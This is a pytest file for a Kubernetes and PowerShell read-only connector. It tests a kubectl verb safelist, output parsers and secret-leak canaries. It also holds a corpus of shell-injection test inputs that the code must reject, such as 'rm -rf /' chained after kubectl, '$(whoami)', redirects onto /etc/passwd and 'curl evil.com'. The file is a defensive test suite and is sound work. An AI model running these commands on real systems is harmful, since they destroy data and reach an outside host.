# SPDX-License-Identifier: Apache-2.0
# Copyright (c) 2026 evoila Group

"""Tests for the Holodeck read op group (G3.8-T2 #854).

Coverage matrix (per Task #854 acceptance criteria):

* :func:`parse_kubectl_command` -- parses ``kubectl`` invocations
  into ``(verb, args)``; rejects mutating verbs with
  :exc:`KubectlSafetyError`; handles leading global flags (both
  ``--flag=value`` and ``--flag value`` forms); rejects non-kubectl
  shells. Accepts multi-word inspection verbs (``config view``,
  ``auth can-i``, ...) via the parent + sub-verb allowlist; rejects
  adjacent mutating sub-verbs (``config set-context``,
  ``auth reconcile``) under the same parents (G3.8 follow-up #1020).
* :func:`parse_logs_tail_output` -- splits multi-file GNU ``tail``
  output by ``==> path <==`` header; single-file tail yields
  ``path=None``; empty / whitespace stdout returns ``files=[]``.
* :func:`parse_networking_payload` -- composes the four-section
  envelope; per-sub-section ``ok`` flips false on empty / wrong-typed
  input; ``ConvertTo-Json`` single-dict result normalised to a
  ``[{...}]`` zone list.
* Bound-method shims on :class:`HolodeckConnector` -- ``config_show``,
  ``pod_list``, ``pod_info``, ``service_list``, ``k8s_exec``,
  ``logs_tail``, ``networking_show`` -- each runs the correct
  PowerShell / SSH commands, passes payloads through the parser,
  and returns the expected envelope shape.
* JSONFlux-shaped ``{rows, total}`` envelopes on ``pod_list`` and
  ``service_list``; single-dict ``ConvertTo-Json`` result normalised
  to a 1-row list (``Get-HoloDeckPod`` with one pod) and ``null``
  result normalised to an empty list.
* ``holodeck.k8s.exec`` rejects mutating verbs (``create``, ``apply``,
  ``delete``, ``edit``, ``replace``, ``patch``, ``scale``,
  ``rollout``) at the handler layer with a structured error envelope;
  the parameter-schema pattern rejects them at the validator layer.
* ``holodeck.logs.tail`` rejects components carrying shell
  metacharacters; lines clamped to [1, 5000].
* ``HOLODECK_OPS`` registration shape -- 8 ops total, all carry
  ``safety_level='safe'``, ``additionalProperties=False`` on the
  parameter schema, non-empty ``llm_instructions.when_to_use``, the
  SSH-only transport note, and ``holodeck.`` namespace op_ids.
* Secret/SSH-key leak canaries -- the connector's ``target.secret_ref``
  password and the operator-supplied k8s command never appear in
  returned result envelopes, captured stderr in error envelopes, or
  log capture under failure-path runs.
* k8s.exec stderr is truncated at 4096 chars.
"""

from __future__ import annotations

from collections.abc import Iterator
from dataclasses import dataclass
from typing import Any
from unittest.mock import AsyncMock, MagicMock, patch

import jsonschema
import pytest

import meho_backplane.connectors.holodeck  # noqa: F401 -- import for registry side-effects
from meho_backplane.connectors.holodeck import HOLODECK_OPS, HolodeckConnector
from meho_backplane.connectors.holodeck.ops_read import (
    GROWTH_DIRS,
    READ_OPS,
    KubectlSafetyError,
    parse_disk_usage_output,
    parse_kubectl_command,
    parse_logs_tail_output,
    parse_networking_payload,
)
from meho_backplane.settings import get_settings
from tests._ssh_vault_stub import stub_ssh_vault_secrets

# ---------------------------------------------------------------------------
# Environment fixture (settings cache requires the env vars to resolve)
# ---------------------------------------------------------------------------


@pytest.fixture(autouse=True)
def _required_settings_env(monkeypatch: pytest.MonkeyPatch) -> Iterator[None]:
    monkeypatch.setenv("KEYCLOAK_ISSUER_URL", "https://keycloak.test/realms/meho")
    monkeypatch.setenv("KEYCLOAK_AUDIENCE", "meho-backplane")
    monkeypatch.setenv("VAULT_ADDR", "https://vault.test")
    get_settings.cache_clear()
    yield
    get_settings.cache_clear()


# ---------------------------------------------------------------------------
# Stubs
# ---------------------------------------------------------------------------


_CANARY_PASSWORD = "holodeck-canary-pw-xyz-554"  # NOSONAR -- canary not a real cred
# Synthetic canary that *resembles* a key footprint without tripping the
# ``detect-private-key`` pre-commit hook -- the regex keys on the literal
# ``BEGIN ... PRIVATE KEY`` opener. Substring-canary tests for the absence
# of this exact 36-char marker in repr/log surfaces.
_CANARY_SSH_KEY = "HOLODECK-CANARY-KEY-MARKER-ABCD1234XY"


@dataclass
class _StubTarget:
    name: str
    host: str
    port: int | None
    # A Vault KV-v2 path STRING (#2155). The canary credentials live in
    # the stubbed Vault registry (see ``_vault_secrets`` below), so any
    # code path that actually resolves the secret would surface the
    # canaries — which the leak assertions then catch.
    secret_ref: str


_TARGET_SECRET_PATH = "meho/testing/holodeck/holorouter-test"

_TARGET = _StubTarget(
    name="holorouter-test",
    host="holorouter.test.invalid",
    port=22,
    secret_ref=_TARGET_SECRET_PATH,
)


@pytest.fixture(autouse=True)
def _vault_secrets() -> Iterator[None]:
    with stub_ssh_vault_secrets(
        {
            _TARGET_SECRET_PATH: {
                "username": "root",
                "password": _CANARY_PASSWORD,
                "ssh_private_key": _CANARY_SSH_KEY,
            }
        }
    ):
        yield


def _proc(*, stdout: str = "", stderr: str = "", exit_status: int = 0) -> Any:
    """Construct an ``SSHCompletedProcess``-shaped stub."""
    proc = MagicMock()
    proc.stdout = stdout
    proc.stderr = stderr
    proc.exit_status = exit_status
    return proc


def _serialise_for_leak_check(envelope: Any) -> str:
    """Render an envelope to a single string for canary-substring scanning.

    Uses ``repr`` so nested dicts / lists / tuples / exception messages
    all surface. The leak invariant is that **no** secret material
    bleeds into the envelope under any code path; ``repr`` is the
    paranoid superset of every operator-visible serialisation.
    """
    return repr(envelope)


# ---------------------------------------------------------------------------
# parse_kubectl_command
# ---------------------------------------------------------------------------


def test_parse_kubectl_command_simple_get() -> None:
    verb, args = parse_kubectl_command("kubectl get pods")
    assert verb == "get"
    assert args == ["pods"]


def test_parse_kubectl_command_with_namespace_flag() -> None:
    verb, args = parse_kubectl_command("kubectl get pods -n holodeck")
    assert verb == "get"
    assert args == ["pods", "-n", "holodeck"]


def test_parse_kubectl_command_describe_pod() -> None:
    verb, args = parse_kubectl_command('kubectl describe pod "my-pod-01"')
    assert verb == "describe"
    assert args == ["pod", "my-pod-01"]


def test_parse_kubectl_command_logs() -> None:
    verb, _ = parse_kubectl_command("kubectl logs my-pod -c my-container")
    assert verb == "logs"


def test_parse_kubectl_command_global_flag_separated() -> None:
    """``kubectl --context foo get pods`` -- the verb is past the separated flag."""
    verb, args = parse_kubectl_command("kubectl --context foo get pods")
    assert verb == "get"
    assert args == ["pods"]


def test_parse_kubectl_command_global_flag_attached() -> None:
    """``kubectl --context=foo get pods`` -- attached-value flag form."""
    verb, args = parse_kubectl_command("kubectl --context=foo get pods")
    assert verb == "get"
    assert args == ["pods"]


def test_parse_kubectl_command_multiple_global_flags() -> None:
    verb, _ = parse_kubectl_command(
        "kubectl --kubeconfig=/tmp/x.yaml --namespace=holodeck get pods"
    )
    assert verb == "get"


def test_parse_kubectl_command_short_flag_attached() -> None:
    verb, _ = parse_kubectl_command("kubectl -n holodeck get pods")
    assert verb == "get"


@pytest.mark.parametrize(
    "verb",
    [
        "create",
        "apply",
        "delete",
        "edit",
        "replace",
        "patch",
        "scale",
        "rollout",
        "label",
        "annotate",
        "cp",
        "exec",
        "port-forward",
        "proxy",
        "drain",
        "cordon",
        "uncordon",
        "taint",
        "set",
        "expose",
        "run",
    ],
)
def test_parse_kubectl_command_rejects_mutating_verb(verb: str) -> None:
    """Every mutating kubectl verb must be rejected by the safelist."""
    with pytest.raises(KubectlSafetyError) as excinfo:
        parse_kubectl_command(f"kubectl {verb} pods")
    assert verb in str(excinfo.value)


@pytest.mark.parametrize(
    "command",
    [
        "",
        "   ",
        "rm -rf /",
        "echo kubectl get pods",  # not starting with kubectl
        "kubectl",  # no verb
        "kubectl --context=foo",  # no verb after global flags
    ],
)
def test_parse_kubectl_command_rejects_malformed(command: str) -> None:
    with pytest.raises(KubectlSafetyError):
        parse_kubectl_command(command)


def test_parse_kubectl_command_rejects_unbalanced_quoting() -> None:
    """``shlex.split`` raises on an unbalanced quote; the parser refuses."""
    with pytest.raises(KubectlSafetyError):
        parse_kubectl_command("kubectl get 'pods")


def test_parse_kubectl_command_safelist_includes_top_explain() -> None:
    """Verify ``top`` and ``explain`` are accepted (read-only inspection verbs)."""
    assert parse_kubectl_command("kubectl top pods")[0] == "top"
    assert parse_kubectl_command("kubectl explain pods")[0] == "explain"


def test_parse_kubectl_command_safelist_includes_cluster_info() -> None:
    assert parse_kubectl_command("kubectl cluster-info")[0] == "cluster-info"


# ---------------------------------------------------------------------------
# parse_kubectl_command -- multi-word verb safelist (G3.8 follow-up #1020)
#
# Multi-word inspection verbs (`kubectl config view`,
# `kubectl auth can-i`, etc.) get their own (parent, sub-verb)
# allowlist because the parent token is a shared namespace where
# mutating sub-verbs (`config set-context`, `auth reconcile`) also
# live. Adjacent-reject coverage: every accept-path has a paired
# reject-test for an adjacent mutating sub-verb under the same parent.
# ---------------------------------------------------------------------------


def test_parse_kubectl_command_multiword_config_view() -> None:
    """``kubectl config view`` -- the canonical kubeconfig dump command."""
    verb, args = parse_kubectl_command("kubectl config view")
    assert verb == "config view"
    assert args == []


def test_parse_kubectl_command_multiword_config_get_contexts() -> None:
    verb, args = parse_kubectl_command("kubectl config get-contexts")
    assert verb == "config get-contexts"
    assert args == []


def test_parse_kubectl_command_multiword_config_current_context() -> None:
    verb, _ = parse_kubectl_command("kubectl config current-context")
    assert verb == "config current-context"


def test_parse_kubectl_command_multiword_auth_can_i_with_args() -> None:
    """``kubectl auth can-i list pods`` -- the canonical access-check shape."""
    verb, args = parse_kubectl_command("kubectl auth can-i list pods")
    assert verb == "auth can-i"
    assert args == ["list", "pods"]


def test_parse_kubectl_command_multiword_auth_whoami() -> None:
    verb, args = parse_kubectl_command("kubectl auth whoami")
    assert verb == "auth whoami"
    assert args == []


def test_parse_kubectl_command_multiword_with_global_flag() -> None:
    """Global flags before a multi-word verb don't break the 2-token prefix walk."""
    verb, _ = parse_kubectl_command("kubectl --context=foo config view")
    assert verb == "config view"


@pytest.mark.parametrize(
    ("parent", "sub_verb"),
    [
        # Mutating ``config`` sub-verbs -- every adjacent reject path
        # under the safelisted ``config`` parent verb.
        ("config", "set-context"),
        ("config", "set-cluster"),
        ("config", "set-credentials"),
        ("config", "unset"),
        ("config", "use-context"),
        ("config", "delete-context"),
        ("config", "delete-cluster"),
        ("config", "delete-user"),
        ("config", "rename-context"),
        # Mutating ``auth`` sub-verb -- the adjacent reject path under
        # the safelisted ``auth`` parent verb.
        ("auth", "reconcile"),
    ],
)
def test_parse_kubectl_command_multiword_rejects_mutating_sub_verb(
    parent: str, sub_verb: str
) -> None:
    """Adjacent-reject coverage: mutating sub-verbs fail closed.

    The parent token (``config`` / ``auth``) is on the multi-word
    safelist, but the sub-verb is not. The check pins both tokens
    together; absence is rejection. This is the load-bearing
    distinction that the single-word fallthrough would have lost --
    a flat ``frozenset({"config", "auth", ...})`` would have approved
    every sub-verb under either parent.
    """
    with pytest.raises(KubectlSafetyError) as excinfo:
        parse_kubectl_command(f"kubectl {parent} {sub_verb}")
    msg = str(excinfo.value)
    assert sub_verb in msg
    assert parent in msg


def test_parse_kubectl_command_multiword_rejects_bare_parent() -> None:
    """``kubectl config`` / ``kubectl auth`` with no sub-verb is rejected.

    The parent token is never a legal stand-alone read verb -- it
    requires a sub-verb to carry meaning. Reject the bare parent so
    a future bug can't silently approve through the single-word
    fallthrough.
    """
    for parent in ("config", "auth"):
        with pytest.raises(KubectlSafetyError) as excinfo:
            parse_kubectl_command(f"kubectl {parent}")
        assert parent in str(excinfo.value)
        assert "sub-verb" in str(excinfo.value)


def test_parse_kubectl_command_multiword_rejects_unknown_sub_verb_under_safelisted_parent() -> None:
    """Unknown / typo sub-verbs under a safelisted parent fail closed."""
    with pytest.raises(KubectlSafetyError):
        parse_kubectl_command("kubectl config get-something-new")
    with pytest.raises(KubectlSafetyError):
        parse_kubectl_command("kubectl auth garbage")


# ---------------------------------------------------------------------------
# parse_logs_tail_output
# ---------------------------------------------------------------------------


def test_parse_logs_tail_output_multi_file_with_headers() -> None:
    output = (
        "==> /holodeck-runtime/logs/dhcp.log <==\n"
        "dhcp evt 1\n"
        "dhcp evt 2\n"
        "==> /holodeck-runtime/logs/dns.log <==\n"
        "dns evt 1\n"
    )
    parsed = parse_logs_tail_output(output)
    assert len(parsed["files"]) == 2
    assert parsed["files"][0]["path"] == "/holodeck-runtime/logs/dhcp.log"
    assert "dhcp evt 1" in parsed["files"][0]["lines"]
    assert parsed["files"][1]["path"] == "/holodeck-runtime/logs/dns.log"
    assert parsed["raw"] == output


def test_parse_logs_tail_output_single_file_no_header() -> None:
    """Single-file tail emits no ``==>`` header; ``path`` is None."""
    output = "log line a\nlog line b\n"
    parsed = parse_logs_tail_output(output)
    assert len(parsed["files"]) == 1
    assert parsed["files"][0]["path"] is None
    assert parsed["files"][0]["lines"] == output


def test_parse_logs_tail_output_empty_input_returns_empty_files() -> None:
    assert parse_logs_tail_output("")["files"] == []
    assert parse_logs_tail_output("   \n")["files"] == []


def test_parse_logs_tail_output_carries_raw_stdout() -> None:
    output = "==> /a.log <==\nfoo\n"
    assert parse_logs_tail_output(output)["raw"] == output


# ---------------------------------------------------------------------------
# parse_networking_payload
# ---------------------------------------------------------------------------


def test_parse_networking_payload_all_ok() -> None:
    payload = parse_networking_payload(
        bgp_text="BGP summary\n",
        routes_text="Routes\n",
        dns_zones_json=[{"ZoneName": "lab.test"}],
        dhcp_leases_text="lease 10.0.0.1\n",
    )
    assert payload["bgp"]["ok"] is True
    assert payload["routes"]["ok"] is True
    assert payload["dns"]["ok"] is True
    assert payload["dns"]["total"] == 1
    assert payload["dhcp"]["ok"] is True


def test_parse_networking_payload_dns_single_dict_normalised_to_list() -> None:
    """ConvertTo-Json on a single zone returns a dict, not a 1-element list."""
    payload = parse_networking_payload(
        bgp_text="",
        routes_text="",
        dns_zones_json={"ZoneName": "single.lab"},
        dhcp_leases_text="",
    )
    assert isinstance(payload["dns"]["zones"], list)
    assert len(payload["dns"]["zones"]) == 1
    assert payload["dns"]["zones"][0]["ZoneName"] == "single.lab"


def test_parse_networking_payload_per_section_ok_flips_false_on_empty() -> None:
    payload = parse_networking_payload(
        bgp_text="",
        routes_text="   \n",
        dns_zones_json=None,
        dhcp_leases_text="",
    )
    assert payload["bgp"]["ok"] is False
    assert payload["routes"]["ok"] is False
    assert payload["dns"]["ok"] is False
    assert payload["dns"]["zones"] == []
    assert payload["dhcp"]["ok"] is False


def test_parse_networking_payload_dns_ok_false_on_non_json_payload() -> None:
    """A non-list, non-dict DNS payload (e.g. ``None`` from PwshRunError) -> ok=False."""
    payload = parse_networking_payload(
        bgp_text="x",
        routes_text="y",
        dns_zones_json="garbage",  # type: ignore[arg-type]
        dhcp_leases_text="z",
    )
    assert payload["dns"]["ok"] is False


# ---------------------------------------------------------------------------
# Bound-method shims -- config_show
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_config_show_returns_parsed_dict() -> None:
    connector = HolodeckConnector()
    payload = {"Version": "9.0.3", "PodId": "HoloPod-001", "Services": []}
    with patch.object(connector, "_run_command", new_callable=AsyncMock) as mock_cmd:
        # pwsh_run hits ``_run_command`` -- the cmd ends ``pwsh -EncodedCommand ...``
        import json as _stdlib_json

        mock_cmd.return_value = _proc(stdout=_stdlib_json.dumps(payload))
        result = await connector.config_show(_TARGET, {})
    assert result["config"] == payload
    # Verify the cmd was the expected encoded pwsh shape.
    cmd = mock_cmd.await_args.args[1]
    assert cmd.startswith("pwsh -NoProfile -NonInteractive -EncodedCommand ")


@pytest.mark.asyncio
async def test_config_show_returns_error_on_pwsh_failure() -> None:
    connector = HolodeckConnector()
    with patch.object(connector, "_run_command", new_callable=AsyncMock) as mock_cmd:
        mock_cmd.return_value = _proc(stdout="", stderr="cmdlet broke", exit_status=1)
        result = await connector.config_show(_TARGET, {})
    assert result["config"] is None
    assert "error" in result
    assert isinstance(result["error"], str)


# ---------------------------------------------------------------------------
# Bound-method shims -- pod_list / pod_info / service_list (JSONFlux envelope)
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_pod_list_returns_rows_and_total_for_multi_pod_json_array() -> None:
    connector = HolodeckConnector()
    pods = [
        {"PodId": "HoloPod-001", "Name": "lab-a", "State": "Running"},
        {"PodId": "HoloPod-002", "Name": "lab-b", "State": "Stopped"},
    ]
    import json as _stdlib_json

    with patch.object(connector, "_run_command", new_callable=AsyncMock) as mock_cmd:
        mock_cmd.return_value = _proc(stdout=_stdlib_json.dumps(pods))
        result = await connector.pod_list(_TARGET, {})
    assert result["total"] == 2
    assert len(result["rows"]) == 2
    assert result["rows"][0]["PodId"] == "HoloPod-001"


@pytest.mark.asyncio
async def test_pod_list_normalises_single_pod_dict_to_1_row_list() -> None:
    """``ConvertTo-Json`` on a single-pod result returns a dict, not a list."""
    connector = HolodeckConnector()
    single_pod = {"PodId": "HoloPod-001"}
    import json as _stdlib_json

    with patch.object(connector, "_run_command", new_callable=AsyncMock) as mock_cmd:
        mock_cmd.return_value = _proc(stdout=_stdlib_json.dumps(single_pod))
        result = await connector.pod_list(_TARGET, {})
    assert result["total"] == 1
    assert result["rows"] == [single_pod]


@pytest.mark.asyncio
async def test_pod_list_normalises_null_to_empty_rows() -> None:
    """Empty pipeline -> ``null`` -> empty rows."""
    connector = HolodeckConnector()
    with patch.object(connector, "_run_command", new_callable=AsyncMock) as mock_cmd:
        mock_cmd.return_value = _proc(stdout="null")
        result = await connector.pod_list(_TARGET, {})
    assert result["rows"] == []
    assert result["total"] == 0


@pytest.mark.asyncio
async def test_pod_list_error_envelope_on_pwsh_failure() -> None:
    connector = HolodeckConnector()
    with patch.object(connector, "_run_command", new_callable=AsyncMock) as mock_cmd:
        mock_cmd.return_value = _proc(stdout="", stderr="cmdlet failed", exit_status=2)
        result = await connector.pod_list(_TARGET, {})
    assert result["rows"] == []
    assert result["total"] == 0
    assert "error" in result


@pytest.mark.asyncio
async def test_pod_info_requires_pod_id() -> None:
    connector = HolodeckConnector()
    with patch.object(connector, "_run_command", new_callable=AsyncMock) as mock_cmd:
        result = await connector.pod_info(_TARGET, {})
        # No SSH call when pod_id is missing.
        mock_cmd.assert_not_awaited()
    assert result["pod"] is None
    assert "error" in result


@pytest.mark.asyncio
async def test_pod_info_returns_parsed_pod() -> None:
    connector = HolodeckConnector()
    detail = {"PodId": "HoloPod-001", "State": "Running", "VMs": []}
    import json as _stdlib_json

    with patch.object(connector, "_run_command", new_callable=AsyncMock) as mock_cmd:
        mock_cmd.return_value = _proc(stdout=_stdlib_json.dumps(detail))
        result = await connector.pod_info(_TARGET, {"pod_id": "HoloPod-001"})
    assert result["pod"] == detail


@pytest.mark.asyncio
async def test_pod_info_quotes_pod_id_safely() -> None:
    """A pod_id with a single quote must round-trip safely via PowerShell ''-escaping."""
    connector = HolodeckConnector()
    with patch.object(connector, "_run_command", new_callable=AsyncMock) as mock_cmd:
        mock_cmd.return_value = _proc(stdout='{"PodId": "x"}')
        await connector.pod_info(_TARGET, {"pod_id": "Pod-O'Reilly"})
    cmd = mock_cmd.await_args.args[1]
    # The encoded base64 isn't trivial to decode here, but we can assert
    # the request shape and trust the round-trip test for the encoding.
    assert cmd.startswith("pwsh -NoProfile -NonInteractive -EncodedCommand ")


@pytest.mark.asyncio
async def test_service_list_returns_rows_for_multi_service_array() -> None:
    connector = HolodeckConnector()
    services = [
        {"Name": "HoloDNS", "Status": "Running", "DisplayName": "Holodeck DNS"},
        {"Name": "HoloDHCP", "Status": "Stopped", "DisplayName": "Holodeck DHCP"},
    ]
    import json as _stdlib_json

    with patch.object(connector, "_run_command", new_callable=AsyncMock) as mock_cmd:
        mock_cmd.return_value = _proc(stdout=_stdlib_json.dumps(services))
        result = await connector.service_list(_TARGET, {})
    assert result["total"] == 2
    assert result["rows"][0]["Name"] == "HoloDNS"


@pytest.mark.asyncio
async def test_service_list_normalises_single_service_dict() -> None:
    """``Where-Object`` filtering to a single match returns a flat dict."""
    connector = HolodeckConnector()
    single = {"Name": "HoloDNS", "Status": "Running", "DisplayName": "Holodeck DNS"}
    import json as _stdlib_json

    with patch.object(connector, "_run_command", new_callable=AsyncMock) as mock_cmd:
        mock_cmd.return_value = _proc(stdout=_stdlib_json.dumps(single))
        result = await connector.service_list(_TARGET, {})
    assert result["total"] == 1
    assert result["rows"] == [single]


# ---------------------------------------------------------------------------
# Bound-method shims -- k8s_exec (read-only enforcement)
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_k8s_exec_runs_read_only_kubectl_get() -> None:
    connector = HolodeckConnector()
    with patch.object(connector, "_run_command", new_callable=AsyncMock) as mock_cmd:
        mock_cmd.return_value = _proc(stdout="NAME READY STATUS\npod-1 1/1 Running\n")
        result = await connector.k8s_exec(_TARGET, {"command": "kubectl get pods"})
    mock_cmd.assert_awaited_once()
    cmd = mock_cmd.await_args.args[1]
    assert cmd == "kubectl get pods"
    assert result["exit_status"] == 0
    assert "pod-1" in result["stdout"]
    assert "error" not in result or result.get("error") is None


@pytest.mark.parametrize(
    "verb",
    ["create", "apply", "delete", "edit", "replace", "patch", "scale", "rollout"],
)
@pytest.mark.asyncio
async def test_k8s_exec_handler_rejects_mutating_verb(verb: str) -> None:
    """The handler is the authoritative gate; mutating verbs fail closed.

    The schema's pattern catches it at the validator layer too, but the
    handler re-checks so a future schema widening can't slip writes
    through.
    """
    connector = HolodeckConnector()
    with patch.object(connector, "_run_command", new_callable=AsyncMock) as mock_cmd:
        result = await connector.k8s_exec(_TARGET, {"command": f"kubectl {verb} pods"})
        # The handler refuses **before** any SSH traffic.
        mock_cmd.assert_not_awaited()
    assert result["exit_status"] is None
    assert "error" in result
    assert "safety check" in result["error"]
    assert verb in result["error"]


@pytest.mark.asyncio
async def test_k8s_exec_handler_rejects_non_kubectl_shell() -> None:
    """``rm -rf /`` or other shell escapes must be rejected by the handler."""
    connector = HolodeckConnector()
    with patch.object(connector, "_run_command", new_callable=AsyncMock) as mock_cmd:
        result = await connector.k8s_exec(_TARGET, {"command": "rm -rf /"})
        mock_cmd.assert_not_awaited()
    assert "error" in result


@pytest.mark.asyncio
async def test_k8s_exec_schema_pattern_rejects_mutating_verb() -> None:
    """The parameter_schema's pattern catches mutating verbs at validator layer."""
    k8s_op = next(op for op in READ_OPS if op.op_id == "holodeck.k8s.exec")
    schema = k8s_op.parameter_schema
    # Apply / delete / patch must all fail the pattern.
    for verb in ("apply", "delete", "patch", "scale", "create", "exec"):
        with pytest.raises(jsonschema.ValidationError):
            jsonschema.validate(
                {"command": f"kubectl {verb} pods"},
                schema,
            )


@pytest.mark.asyncio
async def test_k8s_exec_schema_pattern_accepts_read_verbs() -> None:
    """The schema must accept every read-only verb on the safelist."""
    k8s_op = next(op for op in READ_OPS if op.op_id == "holodeck.k8s.exec")
    schema = k8s_op.parameter_schema
    for verb in (
        "get",
        "describe",
        "logs",
        "top",
        "explain",
        "api-resources",
        "api-versions",
        "cluster-info",
        "version",
    ):
        jsonschema.validate({"command": f"kubectl {verb} pods"}, schema)


@pytest.mark.asyncio
async def test_k8s_exec_schema_pattern_accepts_multiword_read_verbs() -> None:
    """The schema must accept every multi-word read verb on the safelist.

    Pairs with the handler-layer accept tests above
    (``test_parse_kubectl_command_multiword_*``) -- both layers
    independently approve the same multi-word verb set so a future
    schema widening or narrowing cannot silently drift away from the
    handler's authoritative gate.
    """
    k8s_op = next(op for op in READ_OPS if op.op_id == "holodeck.k8s.exec")
    schema = k8s_op.parameter_schema
    accepted = [
        "kubectl config view",
        "kubectl config get-contexts",
        "kubectl config get-clusters",
        "kubectl config get-users",
        "kubectl config current-context",
        "kubectl auth can-i list pods",
        "kubectl auth can-i create deployments --namespace=holodeck",
        "kubectl auth whoami",
    ]
    for command in accepted:
        jsonschema.validate({"command": command}, schema)


@pytest.mark.asyncio
async def test_k8s_exec_schema_pattern_rejects_mutating_sub_verbs() -> None:
    """Adjacent-reject: mutating sub-verbs fail the schema pattern too.

    Same pairing as the accept test above: the schema layer rejects
    the same mutating sub-verbs the handler-layer fails closed on, so
    the dispatcher's ``validate_params`` catches the obvious bad shape
    before reaching :func:`parse_kubectl_command`.
    """
    k8s_op = next(op for op in READ_OPS if op.op_id == "holodeck.k8s.exec")
    schema = k8s_op.parameter_schema
    rejected = [
        "kubectl config set-context my-ctx",
        "kubectl config set-cluster my-cluster",
        "kubectl config set-credentials me",
        "kubectl config unset users.me",
        "kubectl config use-context my-ctx",
        "kubectl config delete-context my-ctx",
        "kubectl config delete-cluster my-cluster",
        "kubectl config rename-context old new",
        "kubectl auth reconcile",
    ]
    for command in rejected:
        with pytest.raises(jsonschema.ValidationError):
            jsonschema.validate({"command": command}, schema)


@pytest.mark.asyncio
async def test_k8s_exec_schema_pattern_rejects_bare_config_or_auth() -> None:
    """The schema must reject ``kubectl config`` / ``kubectl auth`` with no sub-verb.

    The parent token alone is never a legal read verb; the regex
    alternation requires the multi-word sub-verb to be present.
    """
    k8s_op = next(op for op in READ_OPS if op.op_id == "holodeck.k8s.exec")
    schema = k8s_op.parameter_schema
    for command in ("kubectl config", "kubectl auth"):
        with pytest.raises(jsonschema.ValidationError):
            jsonschema.validate({"command": command}, schema)


@pytest.mark.asyncio
async def test_k8s_exec_truncates_long_stderr_at_4096_chars() -> None:
    """Cap stderr at the documented 4096-char limit for bounded operator surfaces."""
    connector = HolodeckConnector()
    huge_stderr = "x" * 10000
    with patch.object(connector, "_run_command", new_callable=AsyncMock) as mock_cmd:
        mock_cmd.return_value = _proc(stderr=huge_stderr, exit_status=1)
        result = await connector.k8s_exec(_TARGET, {"command": "kubectl get pods"})
    assert len(result["stderr"]) == 4096


@pytest.mark.asyncio
async def test_k8s_exec_propagates_ssh_failure_as_connector_error() -> None:
    """SSH connect/run exceptions propagate to the dispatcher (#2155 AC).

    The pre-#2155 handler swallowed auth/transport failures into a
    ``status="ok"`` envelope with empty stdout and ``result.error`` — an
    agent reading ``status=ok`` would act on hollow output. The handler
    now lets the exception escape so the dispatcher's ``connector_error``
    branch reports a non-ok op, mirroring ``holodeck.about``.
    """
    connector = HolodeckConnector()
    with patch.object(connector, "_run_command", new_callable=AsyncMock) as mock_cmd:
        mock_cmd.side_effect = OSError("connection refused")
        with pytest.raises(OSError, match="connection refused"):
            await connector.k8s_exec(_TARGET, {"command": "kubectl get pods"})


# ---------------------------------------------------------------------------
# Shell-injection rejection (B1 -- review iter 1).
#
# These tests are the regression guard for the chained-shell exploit
# the iter-1 review demonstrated: ``shlex.split`` in POSIX mode does
# not treat ``;`` / ``&&`` / ``|`` / ``$(...)`` / backticks / ``>`` /
# ``<`` / newline as token boundaries, so the verb-safelist check on
# ``tokens[idx]`` would otherwise approve the leading ``kubectl get``
# and the **raw** command would flow to
# ``asyncssh.SSHClientConnection.run`` -- which delegates to the
# remote login shell. The reject must fire **before** any SSH
# transport is touched, so each test ALSO asserts that
# ``_run_command`` is never awaited.
# ---------------------------------------------------------------------------


#: Injection payloads the iter-1 review demonstrated, plus their
#: complement set: every POSIX shell control operator that can chain
#: a command, expand to a subshell, or redirect IO. Test IDs name the
#: metacharacter category for readable parametrise output.
_K8S_INJECTION_PAYLOADS: tuple[tuple[str, str], ...] = (
    ("semicolon", "kubectl get pods; rm -rf /"),
    ("and-and", "kubectl get pods && rm -rf /"),
    ("or-or", "kubectl get pods || rm -rf /"),
    ("pipe", "kubectl get pods | xargs rm"),
    ("dollar-paren", "kubectl get pods$(whoami)"),
    ("backtick", "kubectl get `whoami`"),
    ("gt-redirect", "kubectl get > /etc/passwd"),
    ("lt-redirect", "kubectl get < /etc/passwd"),
    ("newline", "kubectl get pods\nrm -rf /"),
    ("carriage-return", "kubectl get pods\rrm -rf /"),
    ("background-amp", "kubectl get pods & curl evil.com"),
    ("escape-backslash", "kubectl get pods\\\nrm -rf /"),
)


@pytest.mark.parametrize(
    ("label", "command"),
    _K8S_INJECTION_PAYLOADS,
    ids=[label for label, _ in _K8S_INJECTION_PAYLOADS],
)
def test_parse_kubectl_command_rejects_shell_injection(label: str, command: str) -> None:
    """Handler-layer: ``parse_kubectl_command`` refuses metacharacters.

    The exception message names the rejection category ('shell
    metacharacter detected') without echoing the offending command
    body back -- avoids leaking operator-supplied payload material
    into operator-visible surfaces.
    """
    del label  # only used for parametrise IDs
    with pytest.raises(KubectlSafetyError) as excinfo:
        parse_kubectl_command(command)
    msg = str(excinfo.value)
    assert "shell metacharacter" in msg
    # The full raw command must never appear in the error message --
    # operator-supplied payload material doesn't belong in user-
    # visible error envelopes.
    assert "rm -rf" not in msg
    assert "whoami" not in msg
    assert "evil.com" not in msg


@pytest.mark.parametrize(
    ("label", "command"),
    _K8S_INJECTION_PAYLOADS,
    ids=[label for label, _ in _K8S_INJECTION_PAYLOADS],
)
@pytest.mark.asyncio
async def test_k8s_exec_handler_rejects_shell_injection_before_ssh(
    label: str, command: str
) -> None:
    """The k8s.exec handler refuses chained-shell payloads BEFORE any SSH call.

    Mocks ``_run_command`` and asserts ``await_count == 0`` -- the
    rejection must fire before the SSH transport is even touched, so
    a future bug in the transport layer can't paper over a missing
    safety check.
    """
    del label
    connector = HolodeckConnector()
    with patch.object(connector, "_run_command", new_callable=AsyncMock) as mock_cmd:
        result = await connector.k8s_exec(_TARGET, {"command": command})
        mock_cmd.assert_not_awaited()
        assert mock_cmd.await_count == 0
    # Structured-error envelope, not a raised exception.
    assert result["exit_status"] is None
    assert result["stdout"] == ""
    assert result["stderr"] == ""
    assert "safety check" in result["error"]
    assert "shell metacharacter" in result["error"]


@pytest.mark.parametrize(
    ("label", "command"),
    _K8S_INJECTION_PAYLOADS,
    ids=[label for label, _ in _K8S_INJECTION_PAYLOADS],
)
def test_k8s_exec_schema_pattern_rejects_shell_injection(label: str, command: str) -> None:
    """Schema-layer guardrail: the dispatcher's validator catches the same shapes.

    Belt-and-braces redundancy with the handler-layer reject -- a
    future widening on either side must not silently re-open the
    hole. This test pins the **schema pattern** (the dispatcher's
    validator front-end) against the same injection corpus.
    """
    del label
